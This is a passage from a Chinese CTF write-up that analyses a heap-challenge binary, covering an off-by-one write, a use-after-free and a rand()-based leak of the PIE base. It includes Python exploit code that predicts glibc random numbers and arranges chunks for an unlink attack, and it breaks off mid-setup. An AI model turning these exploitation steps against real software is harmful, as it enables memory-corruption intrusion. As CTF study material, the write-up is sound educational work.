
```
puts("Which box do U want to leave me message?");

puts("1) little");

puts("2) small");

puts("3) normal");

puts("4) big");

puts("5) huge");

printf("> ");

v3 = getInput();

if ( v3 > 0 && v3 <= 5 )

{

    fflush(stdout);

    if ( boxUsed[v3] )

    {

      for ( i = 0; boxSize[v3] >= i; ++i )

      {

        read(0, &buf, 1uLL);

        if ( buf == 10 )

          break;

        *((_BYTE *)boxBuff[v3] + i) = buf;

      }

    }

    else

    {

      puts("You can not leave me message in the box!");

    }

}

else

{

    puts("It's not a box!");

}
```

向`box`中写入数据，这里也有一个漏洞，写入次数比`buffer`多了一字节，所以可以用`off-by-one`。我没有用这种方式来利用，所以这里给一个`off-by-one`的[相关资料](<https://bbs.kanxue.com/elink@093K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0G2j5X3q4G2i4K6u0W2x3K6j5H3i4K6u0W2j5$3&6Q4x3V1k6D9k6h3q4J5L8X3W2F1k6#2)9J5c8X3c8W2N6r3q4A6L8q4)9J5c8U0x3I4x3e0y4Q4x3X3g2Z5N6r3#2D9>)。

- `4号`功能`show message in box`

    ```
    puts("Which box do U want to see?");

    puts("1) little");

    puts("2) small");

    puts("3) normal");

    puts("4) big");

    puts("5) huge");

    printf("> ");

    v1 = getInput();

    if ( v1 <= 0 || v1 > 5 )

        return puts("It's not a box!");

    if ( boxUsed[v1] )

        return puts((const char *)boxBuff[v1]);

    return puts("You can not see message in the box!");
    ```

    这里到没有什么多说的，很单纯的显示`buffer`内容，可以用来泄露地址。

- `5号`功能`guess a random number`

    ```
    v1 = rand();

    puts("Please input the number you guess:");

    printf("> ");

    if ( v1 == (unsigned int)getInput() )

        result = printf("G00dj0b!You get a secret: %ld!\n", *(_QWORD *)&seed);

    else

        result = printf("Wr0ng answer!The number is %d!\n", v1);

    return result;
    ```

    很好玩的小游戏，预测伪随机数，猜中了返回随机种子，猜错了会告诉你正确的随机数。这里的随机种子就是`seed`全局变量的地址，由于程序开启了`PIE`，所以这里是获取程序基址的地方。

- `6号`功能`exit`

    ```
    puts("What's your name?");

    printf("> ");

    fflush(stdout);

    read(0, src, 0x10uLL);

    dest = (char *)malloc(0x20uLL);

    strcpy(dest, src);

    return printf("Thanks for your coming, %s\n", dest);
    ```

    输入个名字，打印信息并退出，没有利用点。

小结：可以通过猜随机数获取程序基址，利用`free()`时不清空`buffer`指针来构造堆中数据和使用`double free`。

## 0x02 堆溢出的一些资料

> 这部分主要是给自己做个记录，第一次玩堆，看了很多文章，这几篇不错的记录一下备忘。

- [Linux堆内存管理深入分析（上）](<https://bbs.kanxue.com/elink@ffdK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3k6J5k6h3g2T1N6h3k6Q4x3X3g2U0L8$3#2Q4x3V1k6S2M7Y4c8A6j5$3I4W2M7#2)9J5c8Y4y4&6M7%4c8W2L8g2)9J5c8U0p5H3y4o6p5@1y4q4)9J5k6h3S2@1L8h3H3>)
- [Linux堆内存管理深入分析（下）](<https://bbs.kanxue.com/elink@490K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3k6J5k6h3g2T1N6h3k6Q4x3X3g2U0L8$3#2Q4x3V1k6S2M7Y4c8A6j5$3I4W2M7#2)9J5c8Y4y4W2j5%4g2J5K9i4c8&6i4K6u0V1L8h3q4F1j5h3N6W2L8h3g2F1N6q4)9J5c8U0p5H3y4e0t1^5y4g2)9J5k6h3S2@1L8h3H3>)
- [Understanding glibc malloc](<https://bbs.kanxue.com/elink@07bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6M7r3I4G2K9i4c8X3N6h3&6Q4x3X3g2%4L8%4u0V1M7s2u0W2M7%4y4Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5#2i4K6u0r3x3o6u0Q4x3V1j5I4x3q4)9J5c8Y4g2F1k6r3g2J5M7%4c8S2L8X3c8A6L8X3N6Q4x3X3c8Y4L8r3W2T1j5#2)9J5k6r3#2S2L8r3I4G2j5#2)9J5c8X3y4G2L8h3#2W2L8Y4c8Q4x3X3c8H3j5h3N6W2i4K6u0V1x3g2)9J5c8R3>)
- [从一字节溢出到任意代码执行-Linux下堆漏洞利用](<https://bbs.kanxue.com/elink@59fK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0G2j5X3q4G2i4K6u0W2x3K6j5H3i4K6u0W2j5$3&6Q4x3V1k6D9k6h3q4J5L8X3W2F1k6#2)9J5c8X3c8W2N6r3q4A6L8q4)9J5c8U0x3I4x3e0y4Q4x3X3g2Z5N6r3#2D9>)
- [Android中堆unlink利用学习](<https://bbs.kanxue.com/elink@266K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3#2S2L8Y4W2X3j5h3y4W2i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1j5J5x3o6p5$3i4K6u0r3x3o6g2Q4x3V1j5I4z5g2)9J5c8V1q4F1k6s2u0G2K9h3c8t1k6h3q4H3g2h3&6D9K9h3&6C8c8i4S2H3L8r3!0A6N6q4m8J5j5h3y4@1K9h3y4W2i4K6u0r3>)
- [堆溢出的unlink利用方法](<https://bbs.kanxue.com/elink@129K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6G2L8%4W2#2L8W2)9J5k6h3A6G2P5Y4S2A6L8X3N6Q4x3X3g2U0j5#2)9J5c8Y4y4@1j5i4c8A6j5#2)9J5c8X3c8J5L8%4m8K6i4K6u0r3N6r3W2H3M7#2)9J5k6o6M7K6x3U0k6Q4x3X3g2Z5N6r3#2D9>)
- [Linux堆溢出漏洞利用之unlink](<https://bbs.kanxue.com/elink@236K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6G2L8%4W2#2L8W2)9J5k6h3A6G2P5Y4S2A6L8X3N6Q4x3X3g2U0j5#2)9J5c8Y4y4@1j5i4c8A6j5#2)9J5c8X3c8J5L8%4m8K6i4K6u0r3N6r3W2H3M7#2)9J5k6o6p5$3y4U0p5H3i4K6u0W2K9s2c8E0L8l9>)
- [PWN之堆内存管理](<https://bbs.kanxue.com/elink@e3fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5i4m8W2M7W2)9J5k6i4y4W2k6h3u0#2k6#2)9J5k6h3!0J5k6#2)9J5c8U0t1#2y4g2)9J5c8R3>)

## 0x03 构造payload

相关知识了解了以后，就要根据本题的实际情况来构造payload了。

### 获取加载基址

首先先通过猜伪随机数来获取程序的加载基址，怎么去预测伪随机数，这里有篇文章写的很好：[Linux随机数分析](<https://bbs.kanxue.com/elink@081K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3#2#2N6r3g2H3K9h3N6Q4x3X3g2U0L8s2g2T1i4K6u0r3K9h3&6V1k6i4S2Q4x3X3g2H3K9s2m8Q4x3V1k6S2M7X3y4Z5K9i4k6W2M7#2)9J5c8U0j5I4i4K6u0r3>)。

看过文章可以得到一个公式：`r[i] = (r[i-3] + r[i-31]) & 0x7fffffff`

获取基址的代码如下：

```
def guess(i):

    p.sendline('5')

    p.recvuntil('> ')

    p.sendline(str(i))

    res = p.recvline()

    p.recvuntil('> ')

    num = res.split()[-1][:-1]

    return int(num)



print '[+]guess'

p.recvuntil('> ')

baseAddr = 0

lstRand = []

#先获取前31个随机数

for i in range(31):

    lstRand.append(guess(i))



#因为偶尔会有1的误差，所以猜3次

for i in range(31, 33):

    rnd = (lstRand[i-3] + lstRand[i-31]) & 0x7fffffff

    p.sendline('5')

    p.recvuntil('> ')

    p.sendline(str(rnd))

    tmp = p.recvline()

    if 'G00dj0b' in tmp:

        baseAddr = int(tmp.split()[-1][:-1]) - 0x202148

        p.recvuntil('> ')

        break

    p.recvuntil('> ')

print '[+]baseAddr:' + hex(baseAddr)
```

### unlink

由于只有`small`和`normal`的`box`可以`free()`，所以先创建`normal`与`big`，然后释放掉`normal`，之后再创建`little`与`small`，并通过`normal`的指针来构造`fake chunk`，下面结合实际代码与内存来演示如何构造`fake chunk`。

1. 首先申请400与450大小的`normal box`和`big box`，释放`normal box`，再申请150与200大小的`little box`和`small box`，这样`normal box`与`little box`的指针是同一个地址，又由于本程序中写入数据只看指针与`box`大小，所以此时的`normal box`的指针可以同时操作`little box`和`small box`的内存，这样就可以来构造`fake chunk`，代码如下：

```
def createBox(index, size):

    p.sendline('1')

    p.recvuntil('> ')

    p.sendline(str(index))

    p.recvuntil('> ')

    p.sendline(str(size))

    p.recvuntil('> ')



def freeBox(index):

    p.sendline('2')

    p.recvuntil('> ')

    p.sendline(str(index))

    p.recvuntil('> ')



def writeMsg(index, msg):

    p.sendline('3')

    p.recvuntil('> ')

    p.sendline(str(index))

    p.sendline(msg)

    p.recvuntil('> ')



createBox(3, 400)

createBox(4, 450)

freeBox(3)



createBox(1, 150)

createBox(2, 200)
```

以上代码执行后内存数据如下：
